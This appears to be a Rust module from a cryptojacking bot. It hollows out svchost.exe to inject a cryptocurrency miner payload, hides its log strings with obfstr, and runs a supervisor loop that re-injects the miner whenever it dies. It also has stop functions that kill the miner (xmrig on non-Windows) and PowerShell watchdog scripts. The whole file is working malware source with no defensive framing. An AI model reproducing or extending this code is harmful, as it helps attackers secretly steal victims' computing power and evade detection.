pub mod config;
pub mod install;
pub mod status;

use crate::common::constants::get_miner_exe_name;
use obfstr::obfstr;
use std::process::Command;

#[cfg(windows)]
pub fn inject_miner() -> Result<u32, Box<dyn std::error::Error>> {
    let miner_name = get_miner_exe_name();
    let miner_path = std::env::current_exe()?.parent().unwrap().join(&miner_name); // Assume relative to bot
    
    if !miner_path.exists() {
        return Err(format!("Miner not found at {}", miner_path.display()).into());
    }

    let payload = std::fs::read(&miner_path)?;
    
    // Target: svchost.exe (System) or explorer.exe (User)?
    // svchost is better for services.
    let target = "C:\\Windows\\System32\\svchost.exe";
    
    println!("{}: {} {} {}", obfstr!("Injecting"), payload.len(), obfstr!("bytes into"), target);
    unsafe {
        match crate::host::syscalls::hollow_process(target, &payload) {
            Ok(pid) => {
                println!("{}: {}", obfstr!("Injection Success. PID"), pid);
                Ok(pid)
            },
            Err(e) => Err(format!("Injection Failed: {}", e).into())
        }
    }
}

#[cfg(not(windows))]
pub fn inject_miner() -> Result<u32, Box<dyn std::error::Error>> {
    Err("Not supported on non-Windows".into())
}

#[cfg(windows)]
pub async fn miner_supervisor() {
    use std::time::Duration;
    use sysinfo::{Pid, System, SystemExt};

    let mut system = System::new();
    let mut current_pid: Option<u32> = None;

    // Initial Injection
    loop {
        if let Some(pid) = current_pid {
            // Check if alive
            if !system.refresh_process(Pid::from(pid as usize)) {
                println!("{}: {} {}", obfstr!("[-] Injected Miner (PID"), pid, obfstr!(") died. Restarting..."));
                current_pid = None; // Trigger re-injection
            }
        }

        if current_pid.is_none() {
             match inject_miner() {
                 Ok(pid) => {
                     current_pid = Some(pid);
                     // Allow time to stabilize
                     tokio::time::sleep(Duration::from_secs(5)).await;
                 },
                 Err(e) => {
                     eprintln!("{}: {}", obfstr!("[-] Injection Error"), e);
                     // Backoff
                     tokio::time::sleep(Duration::from_secs(30)).await;
                 }
             }
        }
        
        // Loop interval
        tokio::time::sleep(Duration::from_secs(10)).await;
    }
}

#[cfg(not(windows))]
pub async fn miner_supervisor() {
    // Linux/Mac hook for future
}

#[cfg(windows)]
pub fn stop_mining() -> Result<(), Box<dyn std::error::Error>> {
    let miner_name = get_miner_exe_name();
    
    // Kill miner (if any legacy process)
    let _ = Command::new("taskkill")
        .args(&["/F", "/IM", &miner_name])
        .output();
    
    // Kill powershells running sys_*.ps1 (Legacy Watchdogs)
    let _ = Command::new("powershell.exe")
        .args(&["-Command", "Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*sys_*.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"])
        .output();
        
    Ok(())
}

#[cfg(not(windows))]
pub fn stop_mining() -> Result<(), Box<dyn std::error::Error>> {
    let _ = Command::new("pkill").args(&["-f", "xmrig"]).output();
    Ok(())
}
